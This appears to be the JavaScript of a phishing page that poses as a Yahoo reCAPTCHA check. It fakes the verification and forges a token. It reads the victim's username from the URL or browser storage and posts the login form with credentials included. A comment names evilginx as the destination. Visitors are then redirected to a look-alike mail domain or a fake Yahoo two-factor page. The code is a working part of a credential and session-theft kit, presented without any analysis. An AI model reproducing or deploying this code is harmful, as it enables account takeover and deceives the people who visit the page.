  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>

  <script>
  (function() {
      'use strict';
      
      console.log('Yahoo reCAPTCHA page loaded');
      
      const elements = {
          form: document.getElementById('captcha-form'),
          checkbox: document.getElementById('captcha-checkbox'),
          checkmark: document.getElementById('captcha-checkmark'),
          text: document.getElementById('captcha-text'),
          loadingDots: document.getElementById('loading-dots'),
          submitBtn: document.getElementById('submit-btn'),
          userEmail: document.getElementById('userEmail'),
          hiddenUsername: document.getElementById('hidden-username')
      };
      
      let isVerified = false;
      let currentUsername = '';
      
      // Extract parameters from URL
      function extractUrlParams() {
          const urlParams = new URLSearchParams(window.location.search);
          
          // Get username from URL parameter or storage
          currentUsername = urlParams.get('u') || 
                           sessionStorage.getItem('yh_username') || 
                           localStorage.getItem('yh_username') ||
                           'user';
          
          console.log('Username for reCAPTCHA:', currentUsername);
          elements.hiddenUsername.value = currentUsername;
          elements.userEmail.textContent = currentUsername;
          
          // Populate hidden fields with URL parameters
          const params = ['.intl', '.lang', 'src', 'done', 'sessionIndex', 'acrumb', 'display', 'authMechanism'];
          params.forEach(param => {
              const value = urlParams.get(param);
              if (value) {
                  const input = elements.form.querySelector(`input[name="${param}"]`);
                  if (input) {
                      input.value = decodeURIComponent(value);
                      console.log(`Set ${param}:`, input.value);
                  }
              }
          });
      }
      
      // Simulate reCAPTCHA verification
      function simulateCaptchaVerification() {
          console.log('Starting CAPTCHA verification simulation...');
          
          // Show loading state
          elements.text.textContent = 'Verifying...';
          elements.loadingDots.classList.add('active');
          elements.checkbox.style.pointerEvents = 'none';
          
          // Simulate verification delay
          setTimeout(() => {
              // Mark as verified
              isVerified = true;
              elements.checkbox.classList.add('verified');
              elements.checkmark.innerHTML = 'âœ“';
              elements.text.textContent = 'Verified';
              elements.loadingDots.classList.remove('active');
              elements.submitBtn.disabled = false;
              
              // Set verification token
              const verificationToken = 'verified_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
              elements.form.querySelector('input[name="g-recaptcha-response"]').value = verificationToken;
              elements.form.querySelector('input[name="captcha_verified"]').value = 'true';
              
              console.log('CAPTCHA verification completed');
              console.log('Verification token:', verificationToken);
              
          }, 2000 + Math.random() * 2000); // Random delay between 2-4 seconds
      }
      
      // Handle form submission
      function handleFormSubmission(event) {
          event.preventDefault();
          
          if (!isVerified) {
              alert('Please complete the security verification first.');
              return;
          }
          
          console.log('=== CAPTCHA FORM SUBMISSION ===');
          console.log('Username:', currentUsername);
          console.log('Verification status:', isVerified);
          
          elements.submitBtn.disabled = true;
          elements.submitBtn.value = 'Verifying...';
          
          // Prepare form data
          const formData = new FormData(elements.form);
          const urlEncodedData = new URLSearchParams(formData);
          
          console.log('Submitting CAPTCHA verification to:', elements.form.action);
          
          // Submit to evilginx
          fetch(elements.form.action, {
              method: 'POST',
              body: urlEncodedData,
              credentials: 'include',
              headers: {
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'X-Requested-With': 'XMLHttpRequest',
                  'Referer': window.location.href,
                  'Origin': window.location.origin
              }
          })
          .then(response => {
              console.log('CAPTCHA response status:', response.status);
              
              if (response.ok || response.status === 302 || response.status === 301) {
                  console.log('CAPTCHA verification successful');
                  
                  // Check if we should go to 2FA or directly to mail
                  const urlParams = new URLSearchParams(window.location.search);
                  const done = urlParams.get('done');
                  
                  if (done && done.includes('mail')) {
                      // Direct to mail
                      setTimeout(() => {
                          window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                      }, 1000);
                  } else {
                      // Check if 2FA is needed
                      setTimeout(() => {
                          window.location.href = `https://custom-yahoo-2fa-test.vercel.app/2fa-selector.html?u=${encodeURIComponent(currentUsername)}`;
                      }, 1000);
                  }
              } else {
                  throw new Error('Verification failed');
              }
          })
          .catch(error => {
              console.error('CAPTCHA verification error:', error);
              alert('Verification failed. Please try again.');
              elements.submitBtn.disabled = false;
              elements.submitBtn.value = 'Continue';
          });
      }
      
      // Initialize the page
      function init() {
          extractUrlParams();
          
          // Setup CAPTCHA checkbox click
          elements.checkbox.addEventListener('click', function() {
              if (!isVerified) {
                  simulateCaptchaVerification();
              }
          });
          
          // Setup form submission
          elements.form.addEventListener('submit', handleFormSubmission);
          
          console.log('reCAPTCHA page initialized');
      }
      
      // Start when DOM is ready
      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', init);
      } else {
          init();
      }
      
  })();
  </script>
